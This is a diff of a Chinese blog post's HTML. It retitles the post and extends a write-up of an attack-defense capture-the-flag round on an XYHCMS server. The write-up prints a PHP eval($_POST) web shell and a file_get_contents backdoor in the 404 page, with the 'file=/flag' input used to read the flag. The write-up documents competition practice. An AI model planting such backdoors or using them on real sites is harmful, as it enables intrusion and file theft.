@@ -22,18 +22,18 @@
 
   <meta name="description" content="2021年AD： 准备工作： 问题： 1，对协议的不了解导致开局很久才登陆上服务器，浪费了首轮的很多时间。 2，没有太过于明确分工， 交流不是很充分，在反馈沟通上还是欠缺。 3，准备不足导致工具使用和代码使用上落后于其他人。 工具：    Xshell xftp python dsafe     连接服务器 图形化操作 写代码 检测简易漏洞">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2021ad">
-<meta property="og:url" content="http://example.com/2021/11/23/2021ad/index.html">
+<meta property="og:title" content="2021_11_ad_r">
+<meta property="og:url" content="http://example.com/2021/11/23/2021-11-ad-r/index.html">
 <meta property="og:site_name" content="Blog">
 <meta property="og:description" content="2021年AD： 准备工作： 问题： 1，对协议的不了解导致开局很久才登陆上服务器，浪费了首轮的很多时间。 2，没有太过于明确分工， 交流不是很充分，在反馈沟通上还是欠缺。 3，准备不足导致工具使用和代码使用上落后于其他人。 工具：    Xshell xftp python dsafe     连接服务器 图形化操作 写代码 检测简易漏洞">
 <meta property="og:locale">
-<meta property="article:published_time" content="2021-11-23T04:17:29.000Z">
-<meta property="article:modified_time" content="2021-11-23T04:19:41.049Z">
+<meta property="article:published_time" content="2021-11-23T12:34:50.000Z">
+<meta property="article:modified_time" content="2021-11-23T13:23:50.338Z">
 <meta property="article:author" content="expansehi">
 <meta property="article:tag" content="ad">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://example.com/2021/11/23/2021ad/">
+<link rel="canonical" href="http://example.com/2021/11/23/2021-11-ad-r/">
 
 
 <script id="page-configurations">
@@ -46,7 +46,7 @@
   };
 </script>
 
-  <title>2021ad | Blog</title>
+  <title>2021_11_ad_r | Blog</title>
   
 
 
@@ -157,7 +157,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/23/2021ad/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/23/2021-11-ad-r/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -170,7 +170,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          2021ad
+          2021_11_ad_r
         </h1>
 
         <div class="post-meta">
@@ -181,7 +181,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2021-11-23 12:17:29 / 修改时间：12:19:41" itemprop="dateCreated datePublished" datetime="2021-11-23T12:17:29+08:00">2021-11-23</time>
+              <time title="创建时间：2021-11-23 20:34:50 / 修改时间：21:23:50" itemprop="dateCreated datePublished" datetime="2021-11-23T20:34:50+08:00">2021-11-23</time>
             </span>
 
           
@@ -242,9 +242,9 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//location end</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ji&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>同样是在文件末尾包含了一个eval函数，利用POST传参，由于这时无法看到（修正），在检查-网络-搜索中搜索flag，在响应标签的201行可以发现目的数据。</p>
 <h4 id="varwwwhtmlpublichomedefault404.html">/var/www/html/Public/Home/default/404.html</h4>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;a title=<span class="string">&quot;官方网站&quot;</span> href=<span class="string">&quot;http://www.xyhcms.com&quot;</span>&gt;XYHCMS&lt;/a&gt; [ <span class="meta">&lt;?php</span> var_dump(file_get_contents(<span class="variable">$file</span>)); <span class="meta">?&gt;</span> ]&lt;/p&gt;</span><br><span class="line"><span class="comment">//file_get_contents 是将文件读入一个字符串</span></span><br><span class="line"><span class="comment">//var_dump 是打印变量的相关信息</span></span><br></pre></td></tr></table></figure>
-<h4 id="section"></h4>
-<h4 id="section-1"></h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;a title=<span class="string">&quot;官方网站&quot;</span> href=<span class="string">&quot;http://www.xyhcms.com&quot;</span>&gt;XYHCMS&lt;/a&gt; [ <span class="meta">&lt;?php</span> var_dump(file_get_contents(<span class="variable">$file</span>)); <span class="meta">?&gt;</span> ]&lt;/p&gt;</span><br><span class="line"><span class="comment">//file_get_contents 是将文件读入一个字符串</span></span><br><span class="line"><span class="comment">//var_dump 是打印变量的相关信息</span></span><br><span class="line"><span class="comment">//此传参会导致打印相关文件内容，未提示的是前面有对$file的POST代码块</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加载index.php+不存在的地址如0000.php转到404</span></span><br><span class="line"><span class="comment">//file=/flag</span></span><br></pre></td></tr></table></figure>
+<p>如果是采取手动，则继续在检查-网络中查找flag{</p>
 
     </div>
 
@@ -325,7 +325,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B9%B4ad"><span class="nav-number">1.</span> <span class="nav-text">2021年AD：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="nav-number">1.1.</span> <span class="nav-text">准备工作：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E9%A2%98"><span class="nav-number">1.1.1.</span> <span class="nav-text">问题：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-number">1.2.</span> <span class="nav-text">工具：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">1.3.</span> <span class="nav-text">注意事项：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E8%AE%B0%E5%BD%95"><span class="nav-number">1.4.</span> <span class="nav-text">详细记录：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.4.1.</span> <span class="nav-text">漏洞：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#config.php"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">config.php</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-1"><span class="nav-number">1.4.1.1.1.</span> <span class="nav-text">注意事项：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">404.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#js.php"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">.js.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#index.php"><span class="nav-number">1.4.1.4.</span> <span class="nav-text">index.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#varwwwhtmlpublichomedefault404.html"><span class="nav-number">1.4.1.5.</span> <span class="nav-text">&#x2F;var&#x2F;www&#x2F;html&#x2F;Public&#x2F;Home&#x2F;default&#x2F;404.html</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#section"><span class="nav-number">1.4.1.6.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#section-1"><span class="nav-number">1.4.1.7.</span> <span class="nav-text"></span></a></li></ol></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B9%B4ad"><span class="nav-number">1.</span> <span class="nav-text">2021年AD：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="nav-number">1.1.</span> <span class="nav-text">准备工作：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E9%A2%98"><span class="nav-number">1.1.1.</span> <span class="nav-text">问题：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-number">1.2.</span> <span class="nav-text">工具：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">1.3.</span> <span class="nav-text">注意事项：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E8%AE%B0%E5%BD%95"><span class="nav-number">1.4.</span> <span class="nav-text">详细记录：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.4.1.</span> <span class="nav-text">漏洞：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#config.php"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">config.php</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-1"><span class="nav-number">1.4.1.1.1.</span> <span class="nav-text">注意事项：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">404.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#js.php"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">.js.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#index.php"><span class="nav-number">1.4.1.4.</span> <span class="nav-text">index.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#varwwwhtmlpublichomedefault404.html"><span class="nav-number">1.4.1.5.</span> <span class="nav-text">&#x2F;var&#x2F;www&#x2F;html&#x2F;Public&#x2F;Home&#x2F;default&#x2F;404.html</span></a></li></ol></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
